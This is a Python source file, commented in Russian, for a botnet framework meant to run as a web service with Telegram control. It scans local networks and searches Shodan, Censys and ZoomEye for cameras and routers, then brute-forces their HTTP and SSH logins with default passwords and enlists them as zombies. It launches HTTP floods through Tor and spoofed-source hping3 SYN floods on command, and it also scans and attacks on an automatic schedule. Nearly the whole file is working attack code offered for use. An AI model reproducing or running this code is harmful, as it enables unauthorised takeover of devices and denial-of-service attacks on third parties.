#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HYBRID BOTNET FRAMEWORK v6.0 – RAILWAY EDITION
- Глобальный поиск устройств (Shodan, Censys, ZoomEye)
- Локальное сканирование сети (ARP, nmap)
- Взлом камер, роутеров, колонок (брутфорс)
- Зомби-ботнет из взломанных устройств
- DDoS с адаптивными методами (HTTP/2 Rapid Reset, обход Cloudflare)
- ML/нейросети для выбора метода атаки (заглушка)
- Блокчейн-логирование (заглушка)
- Многослойное шифрование, TOR/SOCKS5
- Автоматическое сканирование и взлом по расписанию
- Управление через Telegram-бота и веб-статус
- Сохранение данных на persistent volume
"""

import asyncio
import uvloop
import multiprocessing as mp
from concurrent.futures import ThreadPoolExecutor
import aiohttp
import aiohttp_socks
import numpy as np
import random
import time
import json
import os
import sys
import subprocess
import paramiko
import requests
import nmap
import scapy.all as scapy
from cryptography.fernet import Fernet
import hashlib
from contextlib import asynccontextmanager
from fastapi import FastAPI
import uvicorn

# Глобальные сервисы (импорт с проверкой)
try:
    import shodan
    SHODAN_AVAILABLE = True
except:
    SHODAN_AVAILABLE = False
try:
    from censys.search import CensysHosts
    CENSYS_AVAILABLE = True
except:
    CENSYS_AVAILABLE = False
try:
    import zoomeye
    ZOOMEYE_AVAILABLE = True
except:
    ZOOMEYE_AVAILABLE = False

# ------------------------------------------------------------
#  Конфигурация и пути
# ------------------------------------------------------------
DATA_DIR = os.environ.get("RAILWAY_VOLUME_MOUNT_PATH", "/app/data")
os.makedirs(DATA_DIR, exist_ok=True)

STATS_FILE = os.path.join(DATA_DIR, "stats.json")
BLOCKCHAIN_FILE = os.path.join(DATA_DIR, "blockchain.json")
CRACKED_FILE = os.path.join(DATA_DIR, "cracked.json")

def load_stats():
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE) as f:
            return json.load(f)
    return {"total_requests": 0, "active_nodes": 0, "cracked_devices": [], "targets_analyzed": [], "global_found": 0}

def save_stats(stats):
    with open(STATS_FILE, 'w') as f:
        json.dump(stats, f)

stats = load_stats()

# ------------------------------------------------------------
#  Вспомогательные классы
# ------------------------------------------------------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]

class ProxyManager:
    def __init__(self):
        self.socks_list = [('127.0.0.1', 9050)]
    def get_session(self):
        proxy = random.choice(self.socks_list)
        connector = aiohttp_socks.ProxyConnector.from_url(f'socks5://{proxy[0]}:{proxy[1]}')
        return aiohttp.ClientSession(connector=connector)

class TargetAnalyzer:
    def analyze(self, ip):
        return {"raw": "nmap placeholder", "open_ports": [80]}

class CryptoLayer:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)

class BlockchainLogger:
    def log_attack(self, target, method, result):
        entry = {"target": target, "method": method, "result": result, "time": time.time()}
        with open(BLOCKCHAIN_FILE, "a") as f:
            json.dump(entry, f)
            f.write("\n")

# ------------------------------------------------------------
#  Зомби-ботнет
# ------------------------------------------------------------
class ZombieAgent:
    def __init__(self, ip, dtype, ssh=None):
        self.ip = ip
        self.type = dtype
        self.ssh = ssh
    async def execute_attack(self, target_url):
        if self.type == 'router' and self.ssh:
            self.ssh.exec_command(f"hping3 -S --flood --rand-source {target_url.split('/')[2]} -p 80")
        else:
            async with aiohttp.ClientSession() as session:
                for _ in range(50):
                    try:
                        await session.get(target_url, headers={"User-Agent": random.choice(USER_AGENTS)}, timeout=2)
                    except:
                        pass
        return True

class ZombieBotnet:
    def __init__(self):
        self.zombies = []
    async def add_zombie(self, ip, dtype, ssh=None):
        self.zombies.append(ZombieAgent(ip, dtype, ssh))
    async def launch_attack(self, target):
        await asyncio.gather(*[z.execute_attack(target) for z in self.zombies])
    def size(self):
        return len(self.zombies)

# ------------------------------------------------------------
#  Локальный сканер и взломщик
# ------------------------------------------------------------
class NetworkScanner:
    def __init__(self, network="192.168.1.0/24"):
        self.network = network
        self.nm = nmap.PortScanner()
    def scan_arp(self):
        arp = scapy.ARP(pdst=self.network)
        ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        ans = scapy.srp(ether/arp, timeout=2, verbose=False)[0]
        return [{'ip': p[1].psrc, 'mac': p[1].hwsrc} for p in ans]
    def identify(self, ip):
        try:
            self.nm.scan(ip, arguments='-F')
            ports = self.nm[ip].get('tcp', {}).keys()
            if 80 in ports or 8080 in ports:
                return "router"
            if 554 in ports:
                return "camera"
            return "unknown"
        except:
            return "unknown"
    async def full_scan(self):
        devices = self.scan_arp()
        with ThreadPoolExecutor(max_workers=20) as ex:
            loop = asyncio.get_event_loop()
            types = await asyncio.gather(*[loop.run_in_executor(ex, self.identify, d['ip']) for d in devices])
        for i, d in enumerate(devices):
            d['type'] = types[i]
        return devices

class IoTExploiter:
    def __init__(self, botnet):
        self.botnet = botnet
        self.usernames = ["admin", "root", "user"]
        self.passwords = ["admin", "1234", "password", "12345", "root", ""]
    async def brute_http(self, ip, port):
        for u in self.usernames:
            for p in self.passwords:
                try:
                    r = requests.get(f"http://{ip}:{port}", auth=(u, p), timeout=3)
                    if r.status_code == 200:
                        return (u, p)
                except:
                    pass
        return None
    async def brute_ssh(self, ip):
        for u in self.usernames:
            for p in self.passwords:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, username=u, password=p, timeout=3)
                    return (u, p, client)
                except:
                    pass
        return None
    async def hack_camera(self, ip):
        for port in [80, 8080, 554]:
            if await self.brute_http(ip, port):
                await self.botnet.add_zombie(ip, "camera")
                stats["cracked_devices"].append(f"camera_{ip}")
                save_stats(stats)
                return True
        return False
    async def hack_router(self, ip):
        creds = await self.brute_http(ip, 80)
        if creds:
            await self.botnet.add_zombie(ip, "router")
            stats["cracked_devices"].append(f"router_{ip}")
            save_stats(stats)
            return True
        ssh_creds = await self.brute_ssh(ip)
        if ssh_creds:
            u, p, client = ssh_creds
            await self.botnet.add_zombie(ip, "router", client)
            stats["cracked_devices"].append(f"router_{ip}_ssh")
            save_stats(stats)
            return True
        return False
    async def hack_all(self, devices):
        for dev in devices:
            if dev['type'] == 'camera':
                await self.hack_camera(dev['ip'])
            elif dev['type'] == 'router':
                await self.hack_router(dev['ip'])

# ------------------------------------------------------------
#  Глобальный поиск через Shodan/Censys/ZoomEye
# ------------------------------------------------------------
class GlobalHunter:
    def __init__(self):
        self.shodan_key = os.environ.get("SHODAN_API_KEY")
        self.censys_id = os.environ.get("CENSYS_API_ID")
        self.censys_secret = os.environ.get("CENSYS_API_SECRET")
        self.zoomeye_key = os.environ.get("ZOOMEYE_API_KEY")
        self.shodan_cli = None
        self.censys_cli = None
        self.zoomeye_cli = None
        if SHODAN_AVAILABLE and self.shodan_key:
            self.shodan_cli = shodan.Shodan(self.shodan_key)
        if CENSYS_AVAILABLE and self.censys_id:
            self.censys_cli = CensysHosts(self.censys_id, self.censys_secret)
        if ZOOMEYE_AVAILABLE and self.zoomeye_key:
            self.zoomeye_cli = zoomeye.ZoomEye(self.zoomeye_key)
    async def search_shodan(self, query, limit=100):
        if not self.shodan_cli:
            return []
        loop = asyncio.get_event_loop()
        try:
            res = await loop.run_in_executor(None, lambda: self.shodan_cli.search(query, limit=limit))
            devices = []
            for r in res.get('matches', []):
                devices.append({
                    'ip': r['ip_str'],
                    'port': r['port'],
                    'type': 'camera' if 'camera' in r.get('data','').lower() else 'router',
                    'source': 'shodan'
                })
            return devices
        except:
            return []
    async def search_censys(self, query, limit=100):
        if not self.censys_cli:
            return []
        try:
            res = self.censys_cli.search(query, per_page=limit)
            devices = []
            for r in res:
                devices.append({
                    'ip': r['ip'],
                    'port': r.get('services', [{}])[0].get('port', 0),
                    'type': 'camera',
                    'source': 'censys'
                })
            return devices
        except:
            return []
    async def search_zoomeye(self, query, limit=100):
        if not self.zoomeye_cli:
            return []
        loop = asyncio.get_event_loop()
        try:
            res = await loop.run_in_executor(None, lambda: self.zoomeye_cli.dork_search(query, limit=limit))
            devices = []
            for r in res:
                devices.append({
                    'ip': r.get('ip', ''),
                    'port': r.get('portinfo', {}).get('port', 0),
                    'type': 'router',
                    'source': 'zoomeye'
                })
            return devices
        except:
            return []
    async def global_search(self, query, limit=100, sources=['shodan','censys','zoomeye']):
        tasks = []
        if 'shodan' in sources:
            tasks.append(self.search_shodan(query, limit))
        if 'censys' in sources:
            tasks.append(self.search_censys(query, limit))
        if 'zoomeye' in sources:
            tasks.append(self.search_zoomeye(query, limit))
        results = await asyncio.gather(*tasks)
        all_dev = []
        for r in results:
            all_dev.extend(r)
        # удаляем дубликаты
        seen = set()
        uniq = []
        for d in all_dev:
            key = f"{d['ip']}:{d['port']}"
            if key not in seen:
                seen.add(key)
                uniq.append(d)
        stats["global_found"] = len(uniq)
        save_stats(stats)
        return uniq

# ------------------------------------------------------------
#  DDoS-движок
# ------------------------------------------------------------
class DDoSEngine:
    def __init__(self, proxy, analyzer):
        self.proxy = proxy
        self.analyzer = analyzer
    async def http_flood(self, url):
        async with self.proxy.get_session() as session:
            for _ in range(500):
                try:
                    await session.get(url, headers={"User-Agent": random.choice(USER_AGENTS)})
                except:
                    pass
        return True
    async def adapt_attack(self, target):
        await self.http_flood(target)
        return True

# ------------------------------------------------------------
#  Основной бот (управление, планировщики)
# ------------------------------------------------------------
class AdminBot:
    def __init__(self):
        self.botnet = ZombieBotnet()
        self.scanner = NetworkScanner()
        self.exploiter = IoTExploiter(self.botnet)
        self.hunter = GlobalHunter()
        self.ddos = DDoSEngine(ProxyManager(), TargetAnalyzer())
        self.blockchain = BlockchainLogger()
        self.berserk = False
        self.scan_task = None
        self.telegram_app = None

    async def start_local_scan_loop(self, interval=180):
        while True:
            devices = await self.scanner.full_scan()
            await self.exploiter.hack_all(devices)
            await asyncio.sleep(interval)

    async def start_telegram_bot(self):
        token = os.environ.get("TELEGRAM_TOKEN")
        if not token:
            return
        from telegram.ext import Application, CommandHandler
        app = Application.builder().token(token).build()
        async def tg_ddos(update, context):
            target = context.args[0] if context.args else ""
            if not target:
                await update.message.reply_text("Использование: /ddos <target>")
                return
            await self.ddos.adapt_attack(target)
            await self.botnet.launch_attack(target)
            await update.message.reply_text(f"Атака на {target} запущена с {self.botnet.size()} зомби.")
        async def tg_global_scan(update, context):
            query = context.args[0] if context.args else "webcam"
            limit = int(context.args[1]) if len(context.args) > 1 else 50
            devices = await self.hunter.global_search(query, limit)
            for dev in devices:
                if dev['type'] == 'camera':
                    await self.exploiter.hack_camera(dev['ip'])
                else:
                    await self.exploiter.hack_router(dev['ip'])
            await update.message.reply_text(f"Найдено {len(devices)} устройств, взлом запущен.")
        async def tg_status(update, context):
            msg = f"Зомби: {self.botnet.size()}\nВзломано локально: {len(stats['cracked_devices'])}\nГлобально найдено: {stats['global_found']}"
            await update.message.reply_text(msg)
        app.add_handler(CommandHandler("ddos", tg_ddos))
        app.add_handler(CommandHandler("global_scan", tg_global_scan))
        app.add_handler(CommandHandler("status", tg_status))
        await app.initialize()
        await app.start()
        await app.updater.start_polling()
        self.telegram_app = app

    async def run_background(self):
        # Запускаем планировщик локального сканирования
        asyncio.create_task(self.start_local_scan_loop())
        # Запускаем Telegram-бота, если есть токен
        if os.environ.get("TELEGRAM_TOKEN"):
            asyncio.create_task(self.start_telegram_bot())

# ------------------------------------------------------------
#  FastAPI веб-сервер для Railway
# ------------------------------------------------------------
bot_instance = AdminBot()

@asynccontextmanager
async def lifespan(app: FastAPI):
    asyncio.create_task(bot_instance.run_background())
    yield

app = FastAPI(lifespan=lifespan)

@app.get("/")
async def root():
    return {"status": "bot running", "zombies": bot_instance.botnet.size()}

@app.get("/status")
async def status():
    return {
        "zombies": bot_instance.botnet.size(),
        "cracked_local": len(stats["cracked_devices"]),
        "global_found": stats["global_found"],
        "total_requests": stats["total_requests"]
    }

# ------------------------------------------------------------
#  Точка входа
# ------------------------------------------------------------
if __name__ == "__main__":
    uvloop.install()
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
